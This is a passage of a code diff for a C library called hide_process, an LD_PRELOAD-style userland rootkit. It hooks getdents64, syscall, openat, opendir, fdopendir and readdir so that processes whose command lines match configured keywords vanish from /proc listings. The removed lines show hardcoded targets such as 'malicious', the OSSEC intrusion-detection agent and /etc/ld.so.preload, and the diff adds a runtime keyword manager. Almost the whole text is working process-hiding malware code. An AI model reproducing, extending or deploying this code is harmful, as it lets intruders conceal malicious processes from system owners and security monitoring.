@@ -1,4 +1,5 @@
 #define _GNU_SOURCE
+#include "hide_process.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -10,32 +11,36 @@
 #include <unistd.h>
 #include <errno.h>
 #include <stdarg.h>
-
-// Magic keywords to hide - processes/files containing ANY of these will be hidden
-static const char *MAGIC_KEYWORDS[] = {
-    "malicious",
-    "ossec",
-    "hide_process",
-    "/etc/ld.so.preload",
-    NULL  // Sentinel to mark end of array
-};
+#include <pthread.h>
 
 #define MAX_CMDLINE 4096
+#define INITIAL_KEYWORD_CAPACITY 16
 
-// Constructor - runs when library is loaded
-__attribute__((constructor))
-static void init(void) {
-    fprintf(stderr, "\n");
-    fprintf(stderr, "==============================================\n");
-    fprintf(stderr, "[hide_process] Library loaded! PID=%d\n", getpid());
-    fprintf(stderr, "[hide_process] Magic keywords:\n");
-    for (int i = 0; MAGIC_KEYWORDS[i] != NULL; i++) {
-        fprintf(stderr, "[hide_process]   - '%s'\n", MAGIC_KEYWORDS[i]);
-    }
-    fprintf(stderr, "==============================================\n");
-    fprintf(stderr, "\n");
-    fflush(stderr);
-}
+// Keyword manager structure
+static struct {
+    char **keywords;
+    int count;
+    int capacity;
+    pthread_mutex_t lock;
+    int initialized;
+    int debug_enabled;
+} keyword_manager = {
+    .keywords = NULL,
+    .count = 0,
+    .capacity = 0,
+    .lock = PTHREAD_MUTEX_INITIALIZER,
+    .initialized = 0,
+    .debug_enabled = 1  // Debug enabled by default
+};
+
+// Debug logging macro
+#define DEBUG_LOG(fmt, ...) \
+    do { \
+        if (keyword_manager.debug_enabled) { \
+            fprintf(stderr, "[hide_process] " fmt, ##__VA_ARGS__); \
+            fflush(stderr); \
+        } \
+    } while (0)
 
 // Structure for getdents64 - must match kernel structure
 struct linux_dirent64 {
@@ -65,20 +70,255 @@ static struct {
     char path[256];
 } tracked_dirs[MAX_TRACKED_DIRS];
 static int tracked_dir_count = 0;
+static pthread_mutex_t tracked_dirs_lock = PTHREAD_MUTEX_INITIALIZER;
 
-// Check if a string contains any of the magic keywords
+// Initialize the keyword manager
+int hide_process_init(void) {
+    pthread_mutex_lock(&keyword_manager.lock);
+
+    if (keyword_manager.initialized) {
+        pthread_mutex_unlock(&keyword_manager.lock);
+        return 0;  // Already initialized
+    }
+
+    keyword_manager.keywords = malloc(INITIAL_KEYWORD_CAPACITY * sizeof(char *));
+    if (!keyword_manager.keywords) {
+        pthread_mutex_unlock(&keyword_manager.lock);
+        DEBUG_LOG("FATAL: Failed to allocate keyword array: %s\n", strerror(errno));
+        return -1;
+    }
+
+    keyword_manager.capacity = INITIAL_KEYWORD_CAPACITY;
+    keyword_manager.count = 0;
+    keyword_manager.initialized = 1;
+
+    pthread_mutex_unlock(&keyword_manager.lock);
+
+    DEBUG_LOG("\n");
+    DEBUG_LOG("==============================================\n");
+    DEBUG_LOG("Library initialized! PID=%d\n", getpid());
+    DEBUG_LOG("Initial keyword capacity: %d\n", INITIAL_KEYWORD_CAPACITY);
+    DEBUG_LOG("==============================================\n");
+    DEBUG_LOG("\n");
+
+    return 0;
+}
+
+// Add a keyword to the list
+int hide_process_add_keyword(const char *keyword) {
+    if (!keyword) {
+        DEBUG_LOG("ERROR: Cannot add NULL keyword\n");
+        errno = EINVAL;
+        return -1;
+    }
+
+    pthread_mutex_lock(&keyword_manager.lock);
+
+    if (!keyword_manager.initialized) {
+        pthread_mutex_unlock(&keyword_manager.lock);
+        if (hide_process_init() != 0) {
+            DEBUG_LOG("ERROR: Failed to initialize before adding keyword\n");
+            return -1;
+        }
+        pthread_mutex_lock(&keyword_manager.lock);
+    }
+
+    // Check if keyword already exists
+    for (int i = 0; i < keyword_manager.count; i++) {
+        if (strcmp(keyword_manager.keywords[i], keyword) == 0) {
+            pthread_mutex_unlock(&keyword_manager.lock);
+            DEBUG_LOG("Keyword '%s' already exists, not adding duplicate\n", keyword);
+            return 0;  // Not an error, just already exists
+        }
+    }
+
+    // Expand capacity if needed
+    if (keyword_manager.count >= keyword_manager.capacity) {
+        int new_capacity = keyword_manager.capacity * 2;
+        char **new_keywords = realloc(keyword_manager.keywords, new_capacity * sizeof(char *));
+        if (!new_keywords) {
+            pthread_mutex_unlock(&keyword_manager.lock);
+            DEBUG_LOG("FATAL: Failed to expand keyword array from %d to %d: %s\n",
+                     keyword_manager.capacity, new_capacity, strerror(errno));
+            return -1;
+        }
+        keyword_manager.keywords = new_keywords;
+        keyword_manager.capacity = new_capacity;
+        DEBUG_LOG("Expanded keyword capacity to %d\n", new_capacity);
+    }
+
+    // Duplicate the keyword string
+    char *keyword_copy = strdup(keyword);
+    if (!keyword_copy) {
+        pthread_mutex_unlock(&keyword_manager.lock);
+        DEBUG_LOG("FATAL: Failed to duplicate keyword string '%s': %s\n", keyword, strerror(errno));
+        return -1;
+    }
+
+    keyword_manager.keywords[keyword_manager.count] = keyword_copy;
+    keyword_manager.count++;
+
+    pthread_mutex_unlock(&keyword_manager.lock);
+
+    DEBUG_LOG("Added keyword '%s' (now have %d keywords)\n", keyword, keyword_manager.count);
+
+    return 0;
+}
+
+// Remove a keyword from the list
+int hide_process_remove_keyword(const char *keyword) {
+    if (!keyword) {
+        DEBUG_LOG("ERROR: Cannot remove NULL keyword\n");
+        errno = EINVAL;
+        return -1;
+    }
+
+    pthread_mutex_lock(&keyword_manager.lock);
+
+    if (!keyword_manager.initialized) {
+        pthread_mutex_unlock(&keyword_manager.lock);
+        DEBUG_LOG("Library not initialized, nothing to remove\n");
+        return 0;
+    }
+
+    // Find and remove the keyword
+    for (int i = 0; i < keyword_manager.count; i++) {
+        if (strcmp(keyword_manager.keywords[i], keyword) == 0) {
+            free(keyword_manager.keywords[i]);
+
+            // Shift remaining keywords down
+            for (int j = i; j < keyword_manager.count - 1; j++) {
+                keyword_manager.keywords[j] = keyword_manager.keywords[j + 1];
+            }
+
+            keyword_manager.count--;
+            pthread_mutex_unlock(&keyword_manager.lock);
+
+            DEBUG_LOG("Removed keyword '%s' (now have %d keywords)\n", keyword, keyword_manager.count);
+            return 0;
+        }
+    }
+
+    pthread_mutex_unlock(&keyword_manager.lock);
+    DEBUG_LOG("Keyword '%s' not found in list\n", keyword);
+    return 0;  // Not found, but not an error
+}
+
+// Clear all keywords
+int hide_process_clear_keywords(void) {
+    pthread_mutex_lock(&keyword_manager.lock);
+
+    if (!keyword_manager.initialized) {
+        pthread_mutex_unlock(&keyword_manager.lock);
+        DEBUG_LOG("Library not initialized, nothing to clear\n");
+        return 0;
+    }
+
+    for (int i = 0; i < keyword_manager.count; i++) {
+        free(keyword_manager.keywords[i]);
+    }
+
+    keyword_manager.count = 0;
+
+    pthread_mutex_unlock(&keyword_manager.lock);
+
+    DEBUG_LOG("Cleared all keywords\n");
+    return 0;
+}
+
+// Get a copy of the current keyword list
+int hide_process_list_keywords(char ***keywords, int *count) {
+    if (!keywords || !count) {
+        DEBUG_LOG("ERROR: NULL pointer passed to list_keywords\n");
+        errno = EINVAL;
+        return -1;
+    }
+
+    pthread_mutex_lock(&keyword_manager.lock);
+
+    if (!keyword_manager.initialized) {
+        pthread_mutex_unlock(&keyword_manager.lock);
+        *keywords = NULL;
+        *count = 0;
+        return 0;
+    }
+
+    if (keyword_manager.count == 0) {
+        pthread_mutex_unlock(&keyword_manager.lock);
+        *keywords = NULL;
+        *count = 0;
+        return 0;
+    }
+
+    // Allocate array for keyword pointers
+    char **result = malloc(keyword_manager.count * sizeof(char *));
+    if (!result) {
+        pthread_mutex_unlock(&keyword_manager.lock);
+        DEBUG_LOG("FATAL: Failed to allocate result array: %s\n", strerror(errno));
+        return -1;
+    }
+
+    // Copy each keyword
+    for (int i = 0; i < keyword_manager.count; i++) {
+        result[i] = strdup(keyword_manager.keywords[i]);
+        if (!result[i]) {
+            // Cleanup on failure
+            for (int j = 0; j < i; j++) {
+                free(result[j]);
+            }
+            free(result);
+            pthread_mutex_unlock(&keyword_manager.lock);
+            DEBUG_LOG("FATAL: Failed to duplicate keyword %d: %s\n", i, strerror(errno));
+            return -1;
+        }
+    }
+
+    *keywords = result;
+    *count = keyword_manager.count;
+
+    pthread_mutex_unlock(&keyword_manager.lock);
+
+    DEBUG_LOG("Returned copy of %d keywords\n", *count);
+    return 0;
+}
+
+// Enable or disable debug logging
+void hide_process_set_debug(int enabled) {
+    keyword_manager.debug_enabled = enabled ? 1 : 0;
+}
+
+// Constructor - runs when library is loaded
+__attribute__((constructor))
+static void auto_init(void) {
+    if (hide_process_init() != 0) {
+        fprintf(stderr, "[hide_process] FATAL: Auto-initialization failed!\n");
+        fflush(stderr);
+    }
+}
+
+// Check if a string contains any of the magic keywords (thread-safe)
 static int contains_magic_keyword(const char *str) {
     if (!str) {
         return 0;
     }
 
-    for (int i = 0; MAGIC_KEYWORDS[i] != NULL; i++) {
-        if (strstr(str, MAGIC_KEYWORDS[i]) != NULL) {
-            fprintf(stderr, "[hide_process] *** String '%s' contains magic keyword '%s' ***\n",
-                    str, MAGIC_KEYWORDS[i]);
+    pthread_mutex_lock(&keyword_manager.lock);
+
+    if (!keyword_manager.initialized || keyword_manager.count == 0) {
+        pthread_mutex_unlock(&keyword_manager.lock);
+        return 0;
+    }
+
+    for (int i = 0; i < keyword_manager.count; i++) {
+        if (strstr(str, keyword_manager.keywords[i]) != NULL) {
+            DEBUG_LOG("*** String '%s' contains magic keyword '%s' ***\n",
+                    str, keyword_manager.keywords[i]);
+            pthread_mutex_unlock(&keyword_manager.lock);
             return 1;
         }
     }
+
+    pthread_mutex_unlock(&keyword_manager.lock);
     return 0;
 }
 
@@ -92,13 +332,13 @@ static int should_hide_pid(const char *pid_str) {
     // Build path to cmdline file
     snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str);
 
-    fprintf(stderr, "[hide_process] Checking PID %s: opening %s\n", pid_str, path);
+    DEBUG_LOG("Checking PID %s: opening %s\n", pid_str, path);
 
     // Try to open and read cmdline
     fd = open(path, O_RDONLY);
     if (fd == -1) {
         // Process may have exited or we don't have permission
-        fprintf(stderr, "[hide_process] Failed to open %s: %s\n", path, strerror(errno));
+        DEBUG_LOG("Failed to open %s: %s\n", path, strerror(errno));
         return 0;
     }
 
@@ -106,7 +346,7 @@ static int should_hide_pid(const char *pid_str) {
     close(fd);
 
     if (bytes_read <= 0) {
-        fprintf(stderr, "[hide_process] Failed to read cmdline for PID %s (bytes_read=%zd)\n", pid_str, bytes_read);
+        DEBUG_LOG("Failed to read cmdline for PID %s (bytes_read=%zd)\n", pid_str, bytes_read);
         return 0;
     }
 
@@ -123,15 +363,15 @@ static int should_hide_pid(const char *pid_str) {
     }
     cmdline_display[bytes_read] = '\0';
 
-    fprintf(stderr, "[hide_process] PID %s cmdline: '%s'\n", pid_str, cmdline_display);
+    DEBUG_LOG("PID %s cmdline: '%s'\n", pid_str, cmdline_display);
 
     // cmdline has null-separated arguments, check if any magic keyword appears
     if (contains_magic_keyword(cmdline)) {
-        fprintf(stderr, "[hide_process] *** MATCH! Hiding PID %s ***\n", pid_str);
+        DEBUG_LOG("*** MATCH! Hiding PID %s ***\n", pid_str);
         return 1;
     }
 
-    fprintf(stderr, "[hide_process] PID %s does not match any magic keywords\n", pid_str);
+    DEBUG_LOG("PID %s does not match any magic keywords\n", pid_str);
     return 0;
 }
 
@@ -159,31 +399,30 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
     char fd_path[256];
     ssize_t len;
 
-    fprintf(stderr, "[hide_process] getdents64 called: fd=%d, count=%zu\n", fd, count);
-    fflush(stderr);
+    DEBUG_LOG("getdents64 called: fd=%d, count=%zu\n", fd, count);
 
     // Load the original function if we haven't already
     if (!original_getdents64) {
-        fprintf(stderr, "[hide_process] Loading original getdents64...\n");
+        DEBUG_LOG("Loading original getdents64...\n");
         original_getdents64 = dlsym(RTLD_NEXT, "getdents64");
         if (!original_getdents64) {
-            fprintf(stderr, "[hide_process] FATAL: Failed to load original getdents64: %s\n", dlerror());
+            DEBUG_LOG("FATAL: Failed to load original getdents64: %s\n", dlerror());
             errno = ENOSYS;
             return -1;
         }
-        fprintf(stderr, "[hide_process] Successfully loaded original getdents64\n");
+        DEBUG_LOG("Successfully loaded original getdents64\n");
     }
 
     // Call the original getdents64
     nread = original_getdents64(fd, dirp, count);
 
-    fprintf(stderr, "[hide_process] original getdents64 returned: %zd bytes\n", nread);
+    DEBUG_LOG("original getdents64 returned: %zd bytes\n", nread);
 
     if (nread <= 0) {
         if (nread == 0) {
-            fprintf(stderr, "[hide_process] End of directory reached\n");
+            DEBUG_LOG("End of directory reached\n");
         } else {
-            fprintf(stderr, "[hide_process] Error from original getdents64: %s\n", strerror(errno));
+            DEBUG_LOG("Error from original getdents64: %s\n", strerror(errno));
         }
         return nread;
     }
@@ -194,21 +433,21 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
 
     if (len <= 0) {
         // Can't determine what directory this is, pass through unchanged
-        fprintf(stderr, "[hide_process] Can't determine directory path for fd %d: %s\n", fd, strerror(errno));
+        DEBUG_LOG("Can't determine directory path for fd %d: %s\n", fd, strerror(errno));
         return nread;
     }
 
     proc_path[len] = '\0';
 
-    fprintf(stderr, "[hide_process] fd %d points to: %s\n", fd, proc_path);
+    DEBUG_LOG("fd %d points to: %s\n", fd, proc_path);
 
     // Only filter if we're reading /proc
     if (strcmp(proc_path, "/proc") != 0) {
-        fprintf(stderr, "[hide_process] Not /proc, passing through unchanged\n");
+        DEBUG_LOG("Not /proc, passing through unchanged\n");
         return nread;
     }
 
-    fprintf(stderr, "[hide_process] *** Reading /proc - filtering entries ***\n");
+    DEBUG_LOG("*** Reading /proc - filtering entries ***\n");
 
     // Count entries before filtering
     int entry_count = 0;
@@ -218,7 +457,7 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
         entry_count++;
         temp_bpos += d->d_reclen;
     }
-    fprintf(stderr, "[hide_process] Found %d directory entries\n", entry_count);
+    DEBUG_LOG("Found %d directory entries\n", entry_count);
 
     // Filter the directory entries
     bpos = 0;
@@ -226,19 +465,19 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
     while (bpos < nread) {
         d = (struct linux_dirent64 *)((char *)dirp + bpos);
 
-        fprintf(stderr, "[hide_process] Entry: '%s' (type=%d, reclen=%d)\n",
+        DEBUG_LOG("Entry: '%s' (type=%d, reclen=%d)\n",
                 d->d_name, d->d_type, d->d_reclen);
 
         // Check if this is a numeric entry (PID) and should be hidden
         if (is_numeric(d->d_name)) {
-            fprintf(stderr, "[hide_process] '%s' is numeric (PID), checking if should hide...\n", d->d_name);
+            DEBUG_LOG("'%s' is numeric (PID), checking if should hide...\n", d->d_name);
 
             if (should_hide_pid(d->d_name)) {
                 // Remove this entry by shifting remaining entries forward
                 long entry_size = d->d_reclen;
                 long remaining = nread - (bpos + entry_size);
 
-                fprintf(stderr, "[hide_process] *** Filtering out PID %s (entry_size=%ld, remaining=%ld) ***\n",
+                DEBUG_LOG("*** Filtering out PID %s (entry_size=%ld, remaining=%ld) ***\n",
                         d->d_name, entry_size, remaining);
 
                 if (remaining > 0) {
@@ -251,16 +490,16 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
                 filtered_count++;
                 // Don't increment bpos - check the same position again
             } else {
-                fprintf(stderr, "[hide_process] Keeping PID %s\n", d->d_name);
+                DEBUG_LOG("Keeping PID %s\n", d->d_name);
                 bpos += d->d_reclen;
             }
         } else {
-            fprintf(stderr, "[hide_process] '%s' is not numeric, keeping\n", d->d_name);
+            DEBUG_LOG("'%s' is not numeric, keeping\n", d->d_name);
             bpos += d->d_reclen;
         }
     }
 
-    fprintf(stderr, "[hide_process] Filtering complete: removed %d entries, returning %zd bytes\n",
+    DEBUG_LOG("Filtering complete: removed %d entries, returning %zd bytes\n",
             filtered_count, nread);
 
     return nread;
@@ -271,17 +510,14 @@ long syscall(long number, ...) {
     va_list args;
     long result;
 
-    fprintf(stderr, "[hide_process] syscall called: number=%ld\n", number);
-    fflush(stderr);
+    DEBUG_LOG("syscall called: number=%ld\n", number);
 
     // Load original syscall if needed
     if (!original_syscall) {
-        fprintf(stderr, "[hide_process] Loading original syscall...\n");
-        fflush(stderr);
+        DEBUG_LOG("Loading original syscall...\n");
         original_syscall = dlsym(RTLD_NEXT, "syscall");
         if (!original_syscall) {
-            fprintf(stderr, "[hide_process] FATAL: Failed to load original syscall: %s\n", dlerror());
-            fflush(stderr);
+            DEBUG_LOG("FATAL: Failed to load original syscall: %s\n", dlerror());
             errno = ENOSYS;
             return -1;
         }
@@ -289,8 +525,7 @@ long syscall(long number, ...) {
 
     // SYS_getdents64 is syscall number 61 on aarch64
     if (number == 61) {  // SYS_getdents64
-        fprintf(stderr, "[hide_process] Detected SYS_getdents64 via syscall()!\n");
-        fflush(stderr);
+        DEBUG_LOG("Detected SYS_getdents64 via syscall()!\n");
 
         va_start(args, number);
         int fd = va_arg(args, int);
@@ -323,15 +558,13 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
     static int (*original_openat)(int, const char *, int, ...) = NULL;
     mode_t mode = 0;
 
-    fprintf(stderr, "[hide_process] openat called: dirfd=%d, pathname=%s, flags=%d\n", dirfd, pathname, flags);
-    fflush(stderr);
+    DEBUG_LOG("openat called: dirfd=%d, pathname=%s, flags=%d\n", dirfd, pathname, flags);
 
     if (!original_openat) {
-        fprintf(stderr, "[hide_process] Loading original openat...\n");
+        DEBUG_LOG("Loading original openat...\n");
         original_openat = dlsym(RTLD_NEXT, "openat");
         if (!original_openat) {
-            fprintf(stderr, "[hide_process] FATAL: Failed to load original openat: %s\n", dlerror());
-            fflush(stderr);
+            DEBUG_LOG("FATAL: Failed to load original openat: %s\n", dlerror());
             errno = ENOSYS;
             return -1;
         }
@@ -349,8 +582,7 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
     if (strncmp(pathname, "/proc/", 6) == 0) {
         const char *pid_start = pathname + 6;  // Skip "/proc/"
 
-        fprintf(stderr, "[hide_process] openat: Path starts with /proc/, extracting PID from: %s\n", pathname);
-        fflush(stderr);
+        DEBUG_LOG("openat: Path starts with /proc/, extracting PID from: %s\n", pathname);
 
         // Extract PID portion (everything up to next '/' or end of string)
         char pid_str[32];
@@ -361,32 +593,26 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
         }
         pid_str[i] = '\0';
 
-        fprintf(stderr, "[hide_process] openat: Extracted string: '%s'\n", pid_str);
-        fflush(stderr);
+        DEBUG_LOG("openat: Extracted string: '%s'\n", pid_str);
 
         // Check if this is a numeric PID and should be hidden
         if (is_numeric(pid_str)) {
-            fprintf(stderr, "[hide_process] openat: '%s' is numeric (PID), checking if should be hidden...\n", pid_str);
-            fflush(stderr);
+            DEBUG_LOG("openat: '%s' is numeric (PID), checking if should be hidden...\n", pid_str);
 
             if (should_hide_pid(pid_str)) {
-                fprintf(stderr, "[hide_process] *** BLOCKING openat for hidden PID %s (path: %s) ***\n",
+                DEBUG_LOG("*** BLOCKING openat for hidden PID %s (path: %s) ***\n",
                         pid_str, pathname);
-                fprintf(stderr, "[hide_process] *** Returning -1 with errno=ENOENT ***\n");
-                fflush(stderr);
+                DEBUG_LOG("*** Returning -1 with errno=ENOENT ***\n");
                 errno = ENOENT;  // "No such file or directory"
                 return -1;
             } else {
-                fprintf(stderr, "[hide_process] openat: PID %s is NOT hidden, allowing access to %s\n", pid_str, pathname);
-                fflush(stderr);
+                DEBUG_LOG("openat: PID %s is NOT hidden, allowing access to %s\n", pid_str, pathname);
             }
         } else {
-            fprintf(stderr, "[hide_process] openat: '%s' is NOT numeric, not a PID (path: %s)\n", pid_str, pathname);
-            fflush(stderr);
+            DEBUG_LOG("openat: '%s' is NOT numeric, not a PID (path: %s)\n", pid_str, pathname);
         }
     } else {
-        fprintf(stderr, "[hide_process] openat: Path does NOT start with /proc/, no filtering needed\n");
-        fflush(stderr);
+        DEBUG_LOG("openat: Path does NOT start with /proc/, no filtering needed\n");
     }
 
     // Call original openat
@@ -404,15 +630,13 @@ DIR *fdopendir(int fd) {
     char real_path[256];
     ssize_t len;
 
-    fprintf(stderr, "[hide_process] fdopendir called: fd=%d\n", fd);
-    fflush(stderr);
+    DEBUG_LOG("fdopendir called: fd=%d\n", fd);
 
     if (!original_fdopendir) {
-        fprintf(stderr, "[hide_process] Loading original fdopendir...\n");
+        DEBUG_LOG("Loading original fdopendir...\n");
         original_fdopendir = dlsym(RTLD_NEXT, "fdopendir");
         if (!original_fdopendir) {
-            fprintf(stderr, "[hide_process] FATAL: Failed to load original fdopendir: %s\n", dlerror());
-            fflush(stderr);
+            DEBUG_LOG("FATAL: Failed to load original fdopendir: %s\n", dlerror());
             errno = ENOSYS;
             return NULL;
         }
@@ -424,15 +648,13 @@ DIR *fdopendir(int fd) {
 
     if (len > 0) {
         real_path[len] = '\0';
-        fprintf(stderr, "[hide_process] fdopendir: fd %d points to: %s\n", fd, real_path);
-        fflush(stderr);
+        DEBUG_LOG("fdopendir: fd %d points to: %s\n", fd, real_path);
 
         // Check if this is a /proc/<pid> path
         if (strncmp(real_path, "/proc/", 6) == 0) {
             const char *pid_start = real_path + 6;  // Skip "/proc/"
 
-            fprintf(stderr, "[hide_process] fdopendir: Path starts with /proc/, extracting PID from: %s\n", real_path);
-            fflush(stderr);
+            DEBUG_LOG("fdopendir: Path starts with /proc/, extracting PID from: %s\n", real_path);
 
             // Extract PID portion (everything up to next '/' or end of string)
             char pid_str[32];
@@ -443,33 +665,27 @@ DIR *fdopendir(int fd) {
             }
             pid_str[i] = '\0';
 
-            fprintf(stderr, "[hide_process] fdopendir: Extracted string: '%s'\n", pid_str);
-            fflush(stderr);
+            DEBUG_LOG("fdopendir: Extracted string: '%s'\n", pid_str);
 
             // Check if this is a numeric PID and should be hidden
             if (is_numeric(pid_str)) {
-                fprintf(stderr, "[hide_process] fdopendir: '%s' is numeric (PID), checking if should be hidden...\n", pid_str);
-                fflush(stderr);
+                DEBUG_LOG("fdopendir: '%s' is numeric (PID), checking if should be hidden...\n", pid_str);
 
                 if (should_hide_pid(pid_str)) {
-                    fprintf(stderr, "[hide_process] *** BLOCKING fdopendir for hidden PID %s (path: %s) ***\n",
+                    DEBUG_LOG("*** BLOCKING fdopendir for hidden PID %s (path: %s) ***\n",
                             pid_str, real_path);
-                    fprintf(stderr, "[hide_process] *** Returning NULL with errno=ENOENT ***\n");
-                    fflush(stderr);
+                    DEBUG_LOG("*** Returning NULL with errno=ENOENT ***\n");
                     errno = ENOENT;  // "No such file or directory"
                     return NULL;
                 } else {
-                    fprintf(stderr, "[hide_process] fdopendir: PID %s is NOT hidden, allowing access to %s\n", pid_str, real_path);
-                    fflush(stderr);
+                    DEBUG_LOG("fdopendir: PID %s is NOT hidden, allowing access to %s\n", pid_str, real_path);
                 }
             } else {
-                fprintf(stderr, "[hide_process] fdopendir: '%s' is NOT numeric, not a PID (path: %s)\n", pid_str, real_path);
-                fflush(stderr);
+                DEBUG_LOG("fdopendir: '%s' is NOT numeric, not a PID (path: %s)\n", pid_str, real_path);
             }
         }
     } else {
-        fprintf(stderr, "[hide_process] fdopendir: Could not resolve fd %d to path: %s\n", fd, strerror(errno));
-        fflush(stderr);
+        DEBUG_LOG("fdopendir: Could not resolve fd %d to path: %s\n", fd, strerror(errno));
     }
 
     // Call original fdopendir
@@ -477,17 +693,17 @@ DIR *fdopendir(int fd) {
 
     // Track the directory if successful
     if (result && len > 0) {
-        fprintf(stderr, "[hide_process] fdopendir: Tracking DIR handle: %p for path: %s\n", result, real_path);
-        fflush(stderr);
+        DEBUG_LOG("fdopendir: Tracking DIR handle: %p for path: %s\n", result, real_path);
 
+        pthread_mutex_lock(&tracked_dirs_lock);
         if (tracked_dir_count < MAX_TRACKED_DIRS) {
             tracked_dirs[tracked_dir_count].dir = result;
             strncpy(tracked_dirs[tracked_dir_count].path, real_path, sizeof(tracked_dirs[0].path) - 1);
             tracked_dir_count++;
         } else {
-            fprintf(stderr, "[hide_process] WARNING: Tracking array full! Cannot track more directories.\n");
-            fflush(stderr);
+            DEBUG_LOG("WARNING: Tracking array full! Cannot track more directories.\n");
         }
+        pthread_mutex_unlock(&tracked_dirs_lock);
     }
 
     return result;
@@ -497,14 +713,12 @@ DIR *fdopendir(int fd) {
 DIR *opendir(const char *name) {
     static DIR *(*original_opendir)(const char *) = NULL;
 
-    fprintf(stderr, "[hide_process] opendir called: %s\n", name);
-    fflush(stderr);
+    DEBUG_LOG("opendir called: %s\n", name);
 
     if (!original_opendir) {
         original_opendir = dlsym(RTLD_NEXT, "opendir");
         if (!original_opendir) {
-            fprintf(stderr, "[hide_process] FATAL: Failed to load original opendir\n");
-            fflush(stderr);
+            DEBUG_LOG("FATAL: Failed to load original opendir\n");
             return NULL;
         }
     }
@@ -513,8 +727,7 @@ DIR *opendir(const char *name) {
     if (strncmp(name, "/proc/", 6) == 0) {
         const char *pid_start = name + 6;  // Skip "/proc/"
 
-        fprintf(stderr, "[hide_process] opendir: Path starts with /proc/, extracting PID from: %s\n", name);
-        fflush(stderr);
+        DEBUG_LOG("opendir: Path starts with /proc/, extracting PID from: %s\n", name);
 
         // Extract PID portion (everything up to next '/' or end of string)
         char pid_str[32];
@@ -525,49 +738,43 @@ DIR *opendir(const char *name) {
         }
         pid_str[i] = '\0';
 
-        fprintf(stderr, "[hide_process] opendir: Extracted string: '%s'\n", pid_str);
-        fflush(stderr);
+        DEBUG_LOG("opendir: Extracted string: '%s'\n", pid_str);
 
         // Check if this is a numeric PID and should be hidden
         if (is_numeric(pid_str)) {
-            fprintf(stderr, "[hide_process] opendir: '%s' is numeric (PID), checking if should be hidden...\n", pid_str);
-            fflush(stderr);
+            DEBUG_LOG("opendir: '%s' is numeric (PID), checking if should be hidden...\n", pid_str);
 
             if (should_hide_pid(pid_str)) {
-                fprintf(stderr, "[hide_process] *** BLOCKING opendir for hidden PID %s (path: %s) ***\n",
+                DEBUG_LOG("*** BLOCKING opendir for hidden PID %s (path: %s) ***\n",
                         pid_str, name);
-                fprintf(stderr, "[hide_process] *** Returning NULL with errno=ENOENT ***\n");
-                fflush(stderr);
+                DEBUG_LOG("*** Returning NULL with errno=ENOENT ***\n");
                 errno = ENOENT;  // "No such file or directory"
                 return NULL;
             } else {
-                fprintf(stderr, "[hide_process] opendir: PID %s is NOT hidden, allowing access to %s\n", pid_str, name);
-                fflush(stderr);
+                DEBUG_LOG("opendir: PID %s is NOT hidden, allowing access to %s\n", pid_str, name);
             }
         } else {
-            fprintf(stderr, "[hide_process] opendir: '%s' is NOT numeric, not a PID (path: %s)\n", pid_str, name);
-            fflush(stderr);
+            DEBUG_LOG("opendir: '%s' is NOT numeric, not a PID (path: %s)\n", pid_str, name);
         }
     } else {
-        fprintf(stderr, "[hide_process] opendir: Path does NOT start with /proc/, no filtering needed\n");
-        fflush(stderr);
+        DEBUG_LOG("opendir: Path does NOT start with /proc/, no filtering needed\n");
     }
 
     DIR *result = original_opendir(name);
 
     // Track ALL directories now
     if (result) {
-        fprintf(stderr, "[hide_process] Tracking DIR handle: %p for path: %s\n", result, name);
-        fflush(stderr);
+        DEBUG_LOG("Tracking DIR handle: %p for path: %s\n", result, name);
 
+        pthread_mutex_lock(&tracked_dirs_lock);
         if (tracked_dir_count < MAX_TRACKED_DIRS) {
             tracked_dirs[tracked_dir_count].dir = result;
             strncpy(tracked_dirs[tracked_dir_count].path, name, sizeof(tracked_dirs[0].path) - 1);
             tracked_dir_count++;
         } else {
-            fprintf(stderr, "[hide_process] WARNING: Tracking array full! Cannot track more directories.\n");
-            fflush(stderr);
+            DEBUG_LOG("WARNING: Tracking array full! Cannot track more directories.\n");
         }
+        pthread_mutex_unlock(&tracked_dirs_lock);
     }
 
     return result;
@@ -577,25 +784,23 @@ DIR *opendir(const char *name) {
 int closedir(DIR *dirp) {
     static int (*original_closedir)(DIR *) = NULL;
 
-    fprintf(stderr, "[hide_process] closedir called: dirp=%p\n", dirp);
-    fflush(stderr);
+    DEBUG_LOG("closedir called: dirp=%p\n", dirp);
 
     if (!original_closedir) {
         original_closedir = dlsym(RTLD_NEXT, "closedir");
         if (!original_closedir) {
-            fprintf(stderr, "[hide_process] FATAL: Failed to load original closedir\n");
-            fflush(stderr);
+            DEBUG_LOG("FATAL: Failed to load original closedir\n");
             errno = ENOSYS;
             return -1;
         }
     }
 
     // Remove from tracking array to prevent stale entries
+    pthread_mutex_lock(&tracked_dirs_lock);
     for (int i = 0; i < tracked_dir_count; i++) {
         if (tracked_dirs[i].dir == dirp) {
-            fprintf(stderr, "[hide_process] Removing tracked dir: %s (handle %p)\n",
+            DEBUG_LOG("Removing tracked dir: %s (handle %p)\n",
                     tracked_dirs[i].path, dirp);
-            fflush(stderr);
 
             // Shift remaining entries down
             for (int j = i; j < tracked_dir_count - 1; j++) {
@@ -605,6 +810,7 @@ int closedir(DIR *dirp) {
             break;
         }
     }
+    pthread_mutex_unlock(&tracked_dirs_lock);
 
     return original_closedir(dirp);
 }
@@ -614,12 +820,10 @@ struct dirent *readdir(DIR *dirp) {
     struct dirent *entry;
 
     if (!original_readdir) {
-        fprintf(stderr, "[hide_process] Loading original readdir...\n");
-        fflush(stderr);
+        DEBUG_LOG("Loading original readdir...\n");
         original_readdir = dlsym(RTLD_NEXT, "readdir");
         if (!original_readdir) {
-            fprintf(stderr, "[hide_process] FATAL: Failed to load original readdir\n");
-            fflush(stderr);
+            DEBUG_LOG("FATAL: Failed to load original readdir\n");
             return NULL;
         }
     }
@@ -627,6 +831,7 @@ struct dirent *readdir(DIR *dirp) {
     // Find which directory this is
     int is_proc = 0;
     char dir_path[256] = "";
+    pthread_mutex_lock(&tracked_dirs_lock);
     for (int i = 0; i < tracked_dir_count; i++) {
         if (tracked_dirs[i].dir == dirp) {
